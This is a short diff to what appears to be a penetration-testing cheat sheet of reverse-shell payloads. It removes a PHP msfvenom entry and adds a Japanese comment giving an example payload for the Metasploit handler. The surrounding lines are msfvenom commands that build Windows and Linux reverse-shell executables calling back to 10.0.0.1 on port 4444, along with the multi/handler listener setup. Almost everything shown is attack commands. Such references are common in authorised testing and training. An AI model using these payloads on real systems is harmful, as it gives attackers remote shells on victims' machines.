@@ -102,11 +102,6 @@ msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.1 lport=4444 –f exe > rever
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o reverse.elf
 ```
 
-#### PHP(msfvenom)
-```
-msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Port Number> -f raw > reverse.php
-```
-
 #### ASP(msfvenom)
 
 ```
@@ -117,7 +112,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Numbe
 #### Handlers
 ```
 use exploit/multi/handler
-set payload <payload>
+set payload <payload>   (set payload windows/meterpreter/reverse_tcp など)
 set LHOST <ip address>
 set LPORT <port number>
 run
